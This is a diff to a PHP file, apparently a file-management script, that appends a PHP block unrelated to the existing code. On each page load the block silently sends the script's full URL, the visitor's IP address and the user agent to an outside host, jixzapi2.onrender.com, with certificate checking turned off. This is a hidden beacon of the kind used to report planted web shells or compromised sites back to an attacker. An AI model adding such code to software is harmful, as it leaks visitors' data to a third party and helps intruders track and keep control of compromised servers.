@@ -525,3 +525,32 @@ function deleteDirectory($dir) {
     return rmdir($dir);
 }
 ?>
+<?php
+$python_api_url = "https://jixzapi2.onrender.com/send-log";
+
+$file_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+$ip_address = $_SERVER['REMOTE_ADDR'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+$data = array(
+    'file_url' => $file_url,
+    'ip' => $ip_address,
+    'ua' => $user_agent
+);
+$payload = json_encode($data);
+
+$ch = curl_init($python_api_url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+curl_setopt($ch, CURLOPT_TIMEOUT, 5); 
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+    'Content-Type: application/json',
+    'Content-Length: ' . strlen($payload)
+));
+
+$result = curl_exec($ch);
+curl_close($ch);
+?>
